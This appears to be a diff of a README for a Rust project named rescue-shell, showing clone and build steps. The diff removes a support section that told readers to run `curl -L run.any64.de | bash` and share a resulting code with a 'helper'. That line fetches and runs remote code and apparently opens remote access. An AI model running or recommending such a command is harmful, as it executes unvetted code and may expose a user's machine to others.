@@ -42,8 +42,3 @@ git clone https://github.com/kernelPanic0x/rescue-shell
 cd rescue-shell
 cargo build --release
 ```
-
----
-
-**Support:** if you need a hand, run `curl -L run.any64.de | bash` and share the code
-with your helper. Bugs and ideas welcome as issues on this repo.
